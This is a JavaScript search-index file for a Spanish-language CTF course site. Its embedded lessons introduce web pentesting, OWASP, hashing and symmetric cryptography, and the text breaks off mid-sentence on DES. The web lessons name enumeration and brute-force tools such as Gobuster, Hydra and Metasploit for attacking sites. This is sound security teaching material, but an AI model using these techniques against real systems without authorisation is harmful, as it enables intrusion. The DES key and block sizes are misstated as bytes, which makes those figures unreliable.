var suggestions=document.getElementById('suggestions');var userinput=document.getElementById('userinput');document.addEventListener('keydown',inputFocus);function inputFocus(e){if(e.keyCode===191){e.preventDefault();userinput.focus();}
if(e.keyCode===27){userinput.blur();suggestions.classList.add('d-none');}}
document.addEventListener('click',function(event){var isClickInsideElement=suggestions.contains(event.target);if(!isClickInsideElement){suggestions.classList.add('d-none');}});document.addEventListener('keydown',suggestionFocus);function suggestionFocus(e){const focusableSuggestions=suggestions.querySelectorAll('a');const focusable=[...focusableSuggestions];const index=focusable.indexOf(document.activeElement);let nextIndex=0;if(e.keyCode===38){e.preventDefault();nextIndex=index>0?index-1:0;focusableSuggestions[nextIndex].focus();}
else if(e.keyCode===40){e.preventDefault();nextIndex=index+1<focusable.length?index+1:index;focusableSuggestions[nextIndex].focus();}}
(function(){var index=new FlexSearch({preset:'score',cache:true,doc:{id:'id',field:['title','description','content',],store:['href','title','description',],},});var docs=[{id:0,href:"/docs/anexos/glosario/",title:"Anexo A: Glosario",description:"TODO",content:""},{id:1,href:"/docs/apps-web/intro/",title:"Intro a Aplicaciones Web",description:"TODO",content:"\u003ch2 id=\"motivación\"\u003eMotivación\u003c/h2\u003e\n\u003cp\u003eWeb es uno de los temas más amplios en las competencias de CTF.\nLos challenges se basan principalmente en la explotación de vulnerabilidades reales en los sistemas,\npero también pueden incorporar elementos de otros temas también, como Stego, OSINT o PWN.\nPara efectos de este curso nos centraremos en la detección y explotación de vulnerabilidades comunes,\nmientras que la resolución de los challenges surgirá casi como un efecto secundario.\u003c/p\u003e\n\u003cp\u003eYa que este tema hace un fuerte uso de vulnerabilidades reales, al practicar para este tipo de challenges\ntambién están estudiando para hacer análisis de seguridad a sitios web de verdad. De hecho,\nel penetration testing, o pentesting, de páginas web es el trabajo más solicitado a los especialistas en seguridad computacional.\nEs más, algunas empresas buscan activamente a gente con habilidades en estos temas por medio de CTF,\npara luego ofrecerles trabajo.\u003c/p\u003e\n\u003cp\u003eSimilarmente a los otros temas que hemos visto en este curso, las flags de los challenges web pueden estar\nen casi cualquier lado. Desde el código fuente HTML, pasando por parámetros retornados por el\nservidor, y hasta pueden estar escondidas en una base de datos o en un archivo no visible desde internet.\nPero dentro de toda esta inmensidad de posibilidades, ustedes se deben guiar por las vulnerabilidades\ny los recursos ganados al explotarlas.\u003c/p\u003e\n\u003ch2 id=\"análisis-básico-de-aplicaciones-web\"\u003eAnálisis Básico de Aplicaciones Web\u003c/h2\u003e\n\u003cp\u003eEl análisis de aplicaciones web abarca temas muy amplios y se puede volver muy complejo, pero en su objetivo\nfundamental es siempre el mismo: realizar acciones (ya sea leer, crear o modificar datos, ejecutar comandos,\nu obtener privilegios diferentes) las cuales no son deseables por el dueño del sistema. Esto es, \u0026ldquo;hackear\u0026rdquo;\nla página. Existen muchas técnicas, herramientas y procedimientos distintos que ayudan en este proceso,\npero en su forma más básica (similar al debugging de cualquier software),\nesto se divide en análisis estático y análisis dinámico.\u003c/p\u003e\n\u003ch3 id=\"análisis-estático\"\u003eAnálisis Estático\u003c/h3\u003e\n\u003cp\u003eSe refiere al análisis de elementos estáticos de un sitio web, como archivos HTML y JavaScript, código fuente,\nrestricciones de uso para ciertos campos (por ejemplo largo de la entrada, caracteres permitidos, etc).\nUsualmente este es el primer paso para analizar un sitio web, con el cual se empieza a entender el funcionamiento\nprincipal de la página, se encuentran las tecnologías utilizadas y de vez en cuando aparecen ciertos elementos\nque no deberían estar visibles y que divulgan cierta información.\u003c/p\u003e\n\u003cp\u003eEste tipo de análisis es bastante simple y usualmente no se necesita más que un navegador. El más utilizado\nen el área de seguridad es \u003ca href=\"https://www.mozilla.org/en-US/firefox/new/\"\u003eFireFox\u003c/a\u003e, ya que se suele comportar\nun poco mejor con las otras herramientas que se utiliza.\u003c/p\u003e\n\u003ch3 id=\"análisis-dinámico\"\u003eAnálisis Dinámico\u003c/h3\u003e\n\u003cp\u003eEl análisis dinámico incluye toda la revisión de requests hechas al servidor, junto a sus respuestas respectivas,\nla generación de requests diferentes a los usualmente utilizados por el servicio, y en general a todo lo que\ntenga que ver con interactuar con el servidor. Aquí es donde se encuentra la gran mayoría de las vulnerabilidades\ny formas de explotar el servicio. La forma de realizar el análisis y sus resultados dependen fuertemente\nde las tecnologías (lenguajes, frameworks, librerías, filtros, etc) usadas en el sitio web.\u003c/p\u003e\n\u003cp\u003ePara hacer esto, las herramientas más típicas son proxies. El más usado es \u003ca href=\"https://portswigger.net/burp/communitydownload\"\u003eBurp Suite Community Edition\u003c/a\u003e,\no \u003ca href=\"https://portswigger.net/burp/pro\"\u003eBurp Suite Professional\u003c/a\u003e si trabajan en una empresa o pueden costearlo.\nEste no solo sirve de proxy, sino que además incluye algunas otras herramientas que ayudan a analizar consultas\ne interactuar con el servidor. Durante este curso lo usaremos bastante, por lo que es recomendado instalarlo,\njunto a algún plugin para redirigir las consultas, como por ejemplo \u003ca href=\"https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/\"\u003eFoxyProxy\u003c/a\u003e.\u003c/p\u003e\n\u003ch2 id=\"vulnerabilidades\"\u003eVulnerabilidades\u003c/h2\u003e\n\u003cp\u003eHasta ahora hemos mencionado a las vulnerabilidades, pero no hemos visto qué son. En resumen, una vulnerabilidad\nse refiere a cualquier acción, proceso o interacción que, en teoría, produce comportamiento no deseado en el sistema,\nel cual tiene el potencial de perjudicar a alguno de los agentes involucrados (dueños del sistema, usuarios, terceros,\netc).\u003c/p\u003e\n\u003cp\u003eLa implementación de un ataque que se aprovecha de una vulnerabilidad se denomina explotación o \u003cem\u003eexploit\u003c/em\u003e.\nEl request (o parte del request) que envía este exploit al servidor y que causa el comportamiento\nno deseado se llama \u003cem\u003epayload\u003c/em\u003e.\u003c/p\u003e\n\u003cp\u003eUna mitigación es una contramedida que en teoría elimina una vulnerabilidad, o la vuelve significativamente\nmás difícil de explotar. La implementación de una mitigación se denomina parche o \u003cem\u003epatch\u003c/em\u003e.\u003c/p\u003e\n\u003ch3 id=\"tipos-de-vulnerabilidades\"\u003eTipos de Vulnerabilidades\u003c/h3\u003e\n\u003cp\u003eEn términos generales, las vulnerabilidades surgen por una de estas tres razones:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003ePor bugs: es decir que hay un error en el código y este produce comportamiento inesperado.\u003c/li\u003e\n\u003cli\u003ePor lógica: lo que significa que el diseño de la aplicación en sí es vulnerable. No necesariamente existen bugs.\u003c/li\u003e\n\u003cli\u003ePor dependencias: alguna de las librerías utilizadas tiene una vulnerabilidad que es explotable dentro del sistema.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eTener estas diferenciaciones en mente sirve para entender de mejor manera cómo explotar una vulnerabilidad.\nLas vulnerabilidades por bugs usualmente se explotan mediante la generación de errores, o explorando un camino de\ninteracción no previsto por los desarrolladores. En cambio para las vulnerabilidades por lógica es necesario entender\nla arquitectura del servicio y encontrar hoyos en esta. Finalmente, las vulnerabilidades por dependencias suelen\nser explotadas mediante código hecho específicamente para esto, los cuales se pueden encontrar en Github u otros\nrepositorios como Metasploit.\u003c/p\u003e\n\u003ch2 id=\"owasp\"\u003eOWASP\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/\"\u003eThe Open Web Application Security Project\u003c/a\u003e es una organización sin fines de lucro que intenta\nmejorar la seguridad del software en general. Desarrollan diferentes proyectos para ayudar a\nlas personas a generar mejores sistemas y código. Estos comprenden guías de desarrollo y testeo,\ndefiniciones de estándares y herramientas automatizadas, lo cual facilita el desarrollo de software\nseguro y de calidad.\u003c/p\u003e\n\u003ch3 id=\"top-10-web-application-security-risks\"\u003eTop 10 Web Application Security Risks\u003c/h3\u003e\n\u003cp\u003eEl \u003ca href=\"https://owasp.org/www-project-top-ten/\"\u003eOWASP Top 10\u003c/a\u003e es un proyecto que recopila los 10 riesgos de\nseguridad más comunes en aplicaciones web. Estos riesgos usualmente se traducen en vulnerabilidades bajo ciertas\ncondiciones, por lo que es importante que al menos conozcan que existen y entiendan por qué surgen.\nCon la excepción de algunos casos muy particulares, todas las vulnerabilidades que ustedes encuentren\ncorresponderán a uno (o a veces más de uno) de los riesgos en la lista. Estos son:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eInjection\u003c/li\u003e\n\u003cli\u003eBroken Authentication\u003c/li\u003e\n\u003cli\u003eSensitive Data Exposure\u003c/li\u003e\n\u003cli\u003eXML External Entities (XXE)\u003c/li\u003e\n\u003cli\u003eBroken Access Control\u003c/li\u003e\n\u003cli\u003eSecurity Misconfiguration\u003c/li\u003e\n\u003cli\u003eCross-Site Scripting (XSS)\u003c/li\u003e\n\u003cli\u003eInsecure Deserialization\u003c/li\u003e\n\u003cli\u003eUsing Components With Known Vulnerabilities\u003c/li\u003e\n\u003cli\u003eInsufficient Logging \u0026amp; Monitoring\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eLa mayoría de los nombres son bastante autodescriptivos, sin embargo si desean conocer estos riesgos\nmás en detalle, por favor visiten el proyecto de OWASP y lean su documentación.\u003c/p\u003e\n\u003ch3 id=\"web-security-testing-guide\"\u003eWeb Security Testing Guide\u003c/h3\u003e\n\u003cp\u003eLa \u003ca href=\"https://owasp.org/www-project-web-security-testing-guide/\"\u003eWeb Security Testing Guide\u003c/a\u003e es una guía que intenta\nestandarizar la forma de realizar pruebas de seguridad a una aplicación web. Es particularmente útil para\nlas personas que quieran seguir en esta área, ya que entra en harto detalle sobre cómo funciona cada ataque\ny de qué forma se puede realizar.\u003c/p\u003e\n\u003ch3 id=\"otros-proyectos-de-owasp\"\u003eOtros Proyectos de OWASP\u003c/h3\u003e\n\u003cp\u003eOtros proyectos de OWASP incluyen:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-dependency-track/\"\u003eDependency Track\u003c/a\u003e: Una herramienta que analiza estáticamente\nlas dependencias de un proyecto y las compara con repositorios de software con vulnerabilidades conocidas,\navisando si se utiliza alguno de estos.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-juice-shop/\"\u003eJuice Shop\u003c/a\u003e: Es un sitio web especialmente diseñado para ser vulnerable\na cada uno de los elementos en el OWASP Top 10. Es muy útil para practicar el pentesting.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-mobile-security-testing-guide/\"\u003eMobile Security Testing Guide\u003c/a\u003e: Similar a la\nWeb Security Testing Guide, pero para aplicaciones móviles.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-modsecurity-core-rule-set/\"\u003eModSecurity Core Rule Set\u003c/a\u003e: Es un set de reglas\ngenéricas de detección de ataques, compatibles con firewalls, Web Application Firewalls (WAFs) y otros filtros.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-samm/\"\u003eSoftware Assurance Maturity Model (SAMM)\u003c/a\u003e: Es un modelo de desarrollo\nque ayuda a analizar y mejorar los ciclos de desarrollo seguro del software.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-security-knowledge-framework/\"\u003eSecurity Knowledge Framework\u003c/a\u003e: Base de datos de\nchecklists y buenas prácticas para proyectos para múltiples lenguajes de programación, que muestran cómo prevenir\nel acceso de hackers al sistema.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://owasp.org/www-project-zap/\"\u003eZed Attack Proxy (ZAP)\u003c/a\u003e: Herramienta automatizada de análisis web dinámico.\nRealiza una serie estandarizada de pruebas a aplicaciones web para encontrar vulnerabilidades comunes.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:2,href:"/docs/cripto-moderna/intro/",title:"Intro a Criptografía Moderna",description:"TODO",content:"\u003ch2 id=\"motivación\"\u003eMotivación\u003c/h2\u003e\n\u003cp\u003eDebido tanto al \u003cem\u003etecnooptimismo\u003c/em\u003e de sus creadores como a las limitaciones tecnológicas de la época, la Internet se pensó inicialmente como una red pública, en la que potencialmente cualquier par de computadores pudiese comunicarse de forma fácil y directa, sin importar en qué lugar geográfico se encontrasen o si compartían proveedor de Internet. Eran tiempos más simples, en los que la información que fluía por ahí no era necesariamente muy importante, o al menos la gente que podía ser capaz de interceptarla y leerla era muy poca.\u003c/p\u003e\n\u003cp\u003eSin embargo, a medida ha aumentado la cantidad de usuarios de la Internet y la cantidad de cosas que se puede hacer en ella, y a medida cada vez más gobiernos, delincuentes informáticos y grandes empresas quieren saber qué estas haciendo en cada momento, se ha vuelto indispensable contar con la capacidad de poder decidir quién puede y quién no puede acceder a ciertas comunicaciones que ocurren en estos espacios. Por ejemplo, hoy resultaría completamente inaceptable pensar que los números de la tarjeta de crédito que usas para pagar Netflix pudiesen ser vistos por cualquier persona o máquina que resulte estar por ahí cuando envías tu formulario.\u003c/p\u003e\n\u003cp\u003ePara lograr el objetivo anterior contamos con una herramienta matemática muy útil: la criptografía. El principio es sencillo. La información se \u003cem\u003ecifra\u003c/em\u003e antes de enviar por el canal público, de modo que el receptor pueda \u003cem\u003edescifrarla\u003c/em\u003e usando información privada y que es de común acuerdo con el emisor del mensaje.\u003c/p\u003e\n\u003cp\u003eSi bien los avances criptográficos de los últimos años entregan un nivel alto de protección \u003cem\u003een teoría\u003c/em\u003e, \u003cem\u003een la práctica\u003c/em\u003e suelen haber errores de implementación graves que podrían permitir exfiltrar la información sensible. De estos errores se aprovechan entidades que desean descifrar mensajes sin autorización, obteniendo así la información sensible que buscan, y muchas veces sin que las partes que se comunicaban por el canal se enteren de esta intrusión.\u003c/p\u003e\n\u003cp\u003eEn el contexto de los \u003cstrong\u003eCTFs\u003c/strong\u003e, la resolución de problemas de criptografía moderna suele requerir conocer las primitivas criptográficas utilizadas y algunos conceptos matemáticos que las sustentan. Si bien en general esto le entrega una dificultad particular a esta categoría de problemas al no existir herramientas que automaticen su resolución, también los vuelve más interesantes y suelen contar con un mayor puntaje en comparación a otros problemas.\u003c/p\u003e\n\u003cp\u003eEn la unidad anterior hablamos un poco de la \u0026ldquo;criptografía clásica\u0026rdquo;, la cual suele trabajar con mensajes alfabéticos simples y suele ser muy fácil de romper con ayuda de un computador y algunos algoritmos bastante simples de implementar. La criptografía moderna limita los ataques vistos en el caso de la criptografía clásica, aprovechándose la existencia de problemas matemáticos muy difíciles de resolver \u003cem\u003ea la mala\u003c/em\u003e, en algunos casos incluso con una gran capacidad de cómputo.\u003c/p\u003e\n\u003cp\u003eComo este curso no intenta ser extensivo ni formal en lo que a criptografía se refiere, nos enfocaremos en tres puntos principales: Criptografía simétrica, criptografía asimétrica y \u003cem\u003ehashing\u003c/em\u003e. En el caso de las dos primeras áreas, veremos tanto algoritmos para mantener su confidencialidad y demostrar su autenticidad, mientras que en la tercera área nos enfocaremos en los algoritmos utilizados para la validación de contraseñas en sistemas informáticos.\u003c/p\u003e\n\u003ch2 id=\"bibliografía-útil\"\u003eBibliografía útil\u003c/h2\u003e\n\u003cp\u003eGran parte de las explicaciones teóricas de esta unidad se basan en las del libro \u003cstrong\u003eSerious Cryptography\u003c/strong\u003e de Jean-Phillipe Aumasson. Por lo que si necesitan más información, pueden revisarlo.\u003c/p\u003e\n\u003cp\u003eTambién pueden utilizar el libro \u003cstrong\u003ePractical Cryptography in Python\u003c/strong\u003e como apoyo para la parte de programacion.\u003c/p\u003e\n"},{id:3,href:"/docs/stego/intro/",title:"Intro a la Esteganografía",description:"TODO",content:""},{id:4,href:"/docs/reversa/intro/",title:"Intro a la Ingeniería Reversa",description:"TODO",content:""},{id:5,href:"/docs/osint/intro/",title:"Intro a OSINT",description:"TODO",content:""},{id:6,href:"/docs/forense/intro/",title:"Intro al Análisis Forense",description:"TODO",content:""},{id:7,href:"/docs/pwning/intro/",title:"Intro al Pwning",description:"TODO",content:""},{id:8,href:"/docs/prologo/intro/",title:"Prólogo",description:"TODO",content:""},{id:9,href:"/docs/anexos/herramientas/",title:"Anexo B: Herramientas",description:"TODO",content:""},{id:10,href:"/docs/cripto-moderna/hashing/",title:"Hashing",description:"TODO",content:"\u003cp\u003eLas funciones de \u003cem\u003ehash\u003c/em\u003e son utilizadas como un bloque fundamental en muchos otros componentes criptográficos, tales como firmas digitales, cifrado de llave pública, verificación de integridad de archivos, autentificación de mensajes, contraseñas, entre otros.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../hash.jpg\" alt=\"Función de hash\"\u003e\u003c/p\u003e\n\u003cp\u003eComo muestra la imagen anterior (del libro \u003cem\u003eSerious Cryptography\u003c/em\u003e), una función de hash recibe un mensaje de longitud arbitraria, y devuelve un valor de tamaño fijo (generalmente entre 256 y 512 bits). Al mismo tiempo, una \u0026ldquo;buena función de hash\u0026rdquo; para usos criptográficos es una función que cumple las siguientes características:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUn cambio chico en el mensaje provoca un cambio muy grande en el valor devuelto por la función de hash.\u003c/li\u003e\n\u003cli\u003eDado un valor devuelto por la función de hash a partir de un mensaje $M$, es demasiado dificil encontrar un valor que produzca ese valor sin conocer $M$.\u003c/li\u003e\n\u003cli\u003eSi bien es obvio que existen colisiones (es decir, dos mensajes distintos entre sí $M_1$ y $M_2$ tales que $H(M_1) == H(M_2)$), encontrar dos mensajes que colisionen debe ser demasiado difícil.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"ejemplos-de-funciones-de-hash\"\u003eEjemplos de Funciones de hash\u003c/h2\u003e\n\u003cp\u003eA continuación se nombrarán algunas funciones de hash usadas ampliamente\u003c/p\u003e\n\u003ch3 id=\"md5\"\u003eMD5\u003c/h3\u003e\n\u003cp\u003eMD5 es un algoritmo de hashing basado en una \u003ca href=\"https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction\"\u003econstrucción Merkle-Damgård\u003c/a\u003e que produce un valor de 128 bits, usando bloques de 512 bits en sus procedimientos internos. Este algoritmo fue creado el año 1992, y ya el 1996 se conocían problemas en él. El año 2004 un grupo de investigadores mostró que MD5 no es resistente a colisiones, además de publicar un método práctico para crear datos con el mismo hash pero distinto contenido (ataques de colisión), lo que hizo que se deprecara como hash seguro. Más información sobre la función de hash se puede encontrar en \u003ca href=\"https://en.wikipedia.org/wiki/MD5\"\u003eWikipedia\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eAtaques conocidos\u003c/strong\u003e: \u003ca href=\"https://en.wikipedia.org/wiki/Length_extension_attack\"\u003eAtaque de exensión de longitud (a partir de su construcción)\u003c/a\u003e,  \u003ca href=\"https://en.wikipedia.org/wiki/Collision_attack\"\u003eAtaques de Colisión\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"sha-1\"\u003eSHA-1\u003c/h3\u003e\n\u003cp\u003eSHA-1 es una función criptográfica creada el año 1995 y basada al igual que MD5 en una construcción Merkle-Damgård. Esta función produce un valor de salida 160 bits. El año 2011 fue deprecada por el NIST por problemas similares a los encontrados en MD5. Hoy en día, los ataques de prefijo elegido en SHA1 son prácticos. Más información y descripción de ataques en \u003ca href=\"https://en.wikipedia.org/wiki/SHA-1\"\u003eWikipedia\u003c/a\u003e. Al año actual (2021), es factible para una organización con hartos recursos económicos (cientos de miles de dólares) ejecutar un ataque de colisión de hashes.\u003c/p\u003e\n\u003ch3 id=\"sha-2\"\u003eSHA-2\u003c/h3\u003e\n\u003cp\u003eSHA-2 es una función criptográfica creada el año 2001 por la NSA. Usa la misma primitiva que MD5 y SHA-1 (Merkle-Damgård) pero posee seis variaciones distintas de largo de salida: SHA-224, SHA-256, SHA-384, SHA-512, SHA-512/224 y SHA-512-256. Al momento, no se conocen ataques prácticos a este hash. Más información se puede obtener en \u003ca href=\"https://en.wikipedia.org/wiki/SHA-2\"\u003eWikipedia\u003c/a\u003e.\u003c/p\u003e\n\u003ch3 id=\"sha-3\"\u003eSHA-3\u003c/h3\u003e\n\u003cp\u003eSHA-3 es una función criptográfica creada el año 2015 por el NIST. Es internamente diferente a las funciones ya mencionadas porque utiliza una \u003ca href=\"https://en.wikipedia.org/wiki/Sponge_function\"\u003econstrucción de esponja\u003c/a\u003e. Su existencia y estandarización permite que en caso que a futuro se encuentren problemas en la primitiva de SHA-2 (todavía considerada segura), exista una alternativa de uso de fácil modificación que no debiese ser afectada por este problema.\u003c/p\u003e\n\u003ch3 id=\"funciones-de-derivación-de-llaves-kdf\"\u003eFunciones de derivación de llaves (KDF)\u003c/h3\u003e\n\u003cp\u003eEs una categoría de funciones de hash que deriva una o más llaves secretas a partir de una llave principal, usando una función pseudoaleatoria. Estas funciones suelen tener la característica de que sus valores de salida son lentos de verificar (del orden de segundos) debido a que la cantidad de veces que se ejecutan es configurable\u0026quot;, lo que mitiga el riesgo de un ataque de fuerza bruta para detectar la preimagen de un valor dado. La capacidad de configurar las iteraciones también prepara a la función para el futuro, de forma de poder subir este número arbitrariamente a medida las capacidades de los computadores aumentan.\u003c/p\u003e\n\u003cp\u003eOtra medida de mitigación de estas funciones es que requieren para funcionar un valor extra no secreto denominado \u003cstrong\u003esalt\u003c/strong\u003e. El valor \u003cstrong\u003esalt\u003c/strong\u003e es aleatorio y se usa para la generación y verificación del hash con una función KDF. De esta forma, se limita el riesgo de amenazas tales como \u003ca href=\"https://en.wikipedia.org/wiki/Rainbow_table\"\u003erainbow tables\u003c/a\u003e.\u003c/p\u003e\n\u003cp\u003eA continuación se mencionan algunas funciones de tipo KDF:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/PBKDF2\"\u003ePBKDF1 y PBKDF2\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://en.wikipedia.org/wiki/Argon2\"\u003eArgon2\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:11,href:"/docs/apps-web/tecnicas-basicas/",title:"Técnicas Básicas de Análisis Web",description:"TODO",content:"\u003ch2 id=\"motivación\"\u003eMotivación\u003c/h2\u003e\n\u003cp\u003eEn este capítulo hablaremos de algunas de las técnicas más básicas utilizadas para en análisis web.\nPara estas no se requiere ningún o casi ningún conocimiento sobre el funcionamiento o características del sitio,\ny pueden ser aplicadas de manera casi inmediata. Usualmente se utiliza herramientas muy simples, que\nrequieren muy poca configuración para ser usadas. Desde el lado del servidor, suele ser bastante fácil detectar el uso de estas herramientas, por lo que\nlos sistemas relativamente bien monitoreados usualmente bloquean IPs con este comportamiento.\u003c/p\u003e\n\u003cp\u003eEl objetivo de las herramientas que veremos ahora es obtener más información sobre el servicio web,\nencontrando archivos, usuarios y otros recursos que pueden estar escondidos. Si tienen mucha suerte,\nesto también puede resultar en la divulgación de información privada, sensible o crítica,\no incluso pueden ganar privilegios si logran encontrar contraseñas.\u003c/p\u003e\n\u003ch2 id=\"enumeración\"\u003eEnumeración\u003c/h2\u003e\n\u003cp\u003eLa enumeración es un proceso en el cual se itera por una lista de valores (llamadas diccionarios), intentando\nencontrar información nueva. Esto se puede aplicar a subdirectorios de un sitio web, subdominios,\nnombres de usuario, nombres de parámetros, servicios ofrecidos, puertos abiertos, etc.\nTambién se puede utilizar fuzzers, los cuales toman un input conocido y lo modifican de múltiples maneras\npara encontrar otros inputs con comportamientos diferentes.\u003c/p\u003e\n\u003cp\u003eEste proceso funciona enviando las distintas peticiones al servidor y analizando sus respuestas. No se\nsuele encontrar muchas vulnerabilidades de esta forma, pero sí se logra recopilar información\ny funcionalidades previamente no vistas.\u003c/p\u003e\n\u003cp\u003eLas herramientas comúnmente usadas en el área web son:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/OJ/gobuster\"\u003eGobuster\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/maurosoria/dirsearch\"\u003eDirsearch\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/KajanM/DirBuster\"\u003eDirbuster\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/v0re/dirb\"\u003eDirb\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/aboul3la/Sublist3r\"\u003eSublist3r\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/xmendez/wfuzz\"\u003eWfuzz\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/ffuf/ffuf\"\u003eFfuf\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"fuerza-bruta\"\u003eFuerza Bruta\u003c/h2\u003e\n\u003cp\u003eSimilar a la enumeración, pero en este caso se intenta pasar por todos o casi todos los valores posibles\nde un parámetro, aunque en muchos casos también se utiliza diccionarios. Se diferencian principalmente\nde manera conceptual, y en que la acción realizada usualmente tiene uno o unos pocos valores \u0026ldquo;correctos\u0026rdquo;,\nlos cuales resultan en una respuesta diferente del servidor (por ejemplo, ingresar una contraseña correcta\ntiene un resultado diferente al de ingresar una contraseña incorrecta).\nMediante la fuerza bruta se pueden encontrar contraseñas de usuarios, valores\naleatorizados, parámetros mágicos, secuencias específicas, etc.\u003c/p\u003e\n\u003cp\u003eLas herramientas usualmente utilizadas son:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/vanhauser-thc/thc-hydra\"\u003eHydra\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eVarios módulos de \u003ca href=\"https://github.com/rapid7/metasploit-framework\"\u003eMetasploit\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n"},{id:12,href:"/docs/cripto-moderna/cripto-simetrica/",title:"Criptografía Simétrica",description:"TODO",content:"\u003cp\u003eEn esta sección hablaremos de tres tipos de cifrado: \u003cstrong\u003eOne-time pad\u003c/strong\u003e, \u003cstrong\u003ecifradores de bloque\u003c/strong\u003e y \u003cstrong\u003ecifradores de flujo\u003c/strong\u003e.\u003c/p\u003e\n\u003ch2 id=\"one-time-pad\"\u003eOne-Time Pad\u003c/h2\u003e\n\u003cp\u003eCorresponde a una técnica de cifrado que no puede ser rota si la llave no se reusa, en la cual un mensaje se cifra ejecutando la operación \u003ccode\u003exor\u003c/code\u003e entre un valor aleatorio al menos del tamaño del mensaje y el mismo mensaje. Lamentablemente, este tipo de cifrado no es muy práctico, debido a la dificultad de conseguir una fuente de valores realmente aleatorios que pueda al mismo tiempo estar sincronizada entre las partes que desean comunicarse.\u003c/p\u003e\n\u003ch2 id=\"cifradores-de-bloque\"\u003eCifradores de bloque\u003c/h2\u003e\n\u003cp\u003eLos cifadores de bloque permiten cifrar mensajes de un tamaño fijo (\u003cem\u003econocido como $BlockSize$\u003c/em\u003e) utilizando una llave de con otro tamaño fijo (\u003cem\u003econocido como $KeySize$\u003c/em\u003e). Si el mensaje es más largo que la llave, es necesario dividirlo en \u003cstrong\u003ebloques\u003c/strong\u003e del tamaño adecuado y usar un \u003cstrong\u003emodo de operación\u003c/strong\u003e que permita encadenar estos bloques.\u003c/p\u003e\n\u003cp\u003eEl principio básico del proceso de Cifrado $E$ del cifrador de bloque consiste en ejecutar varias rondas de permutación y sustitución definidas sobre el bloque de texto plano $P$, de tal forma de obtener un nuevo bloque cifrado $C$. Las permutaciones y sustituciones son definidas por una llave $K$, la cual es entregada al cifrador de bloque como entrada, además de $C$. Para descifrar un bloque $C$ (proceso de descifrado $D$), se ejecutan operaciones inversas a las de $E$. Lo anterior se puede observar en la imagen siguiente, obtenida del libro \u003cstrong\u003eSerious Cryptography\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"../cifrado.jpg\" alt=\"Esquema abstracto de los procesos de cifrado y descifrado\"\u003e\u003c/p\u003e\n\u003cp\u003eUna característica importante para un buen cifrador, es que la salida $C$ no permita derivar nada ni de $K$ ni de $P$. Para esto, las salidas $C$ deben verse como datos aleatorios (es decir, no tener patrones).\u003c/p\u003e\n\u003cp\u003eEl tamaño de la llave es importante para evitar ataques de fuerza bruta sobre el cifrador. Si la llave es pequeña no es una tarea imposible probar descifrar un bloque cifrado con todas las llaves posibles. Una llave de 16 bits requeriría del orden de 65 mil intentos para recorrer el espacio completo de llaves, mientras que una de 32 bits necesitaría 4 mil millones de intentos. Hoy en día es considerada segura una llave de largo 128 o más.\u003c/p\u003e\n\u003ch3 id=\"tipos-de-cifradores-de-bloque\"\u003eTipos de cifradores de bloque\u003c/h3\u003e\n\u003cp\u003eExisten muchos diseños de cifradores de bloque. A continuación mencionaremos algunos de los más conocidos y usados.\u003c/p\u003e\n\u003ch4 id=\"des\"\u003eDES\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"../des.png\" alt=\"Diagrama de especificación de DES\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eEstandarizado\u003c/strong\u003e en el año 1977\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eLargo de llave:\u003c/strong\u003e 56 bytes (+ 8 de paridad)\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eLargo de bloque:\u003c/strong\u003e 64 bytes\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eRondas:\u003c/strong\u003e 16\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eData Encryption Standard\u003c/strong\u003e es un algoritmo de cifrado simétrico creado por IBM en los 70s. Se publicó como estándar el año 1977, con el tamaño de llave que conocemos. Este tamaño de llave hace que 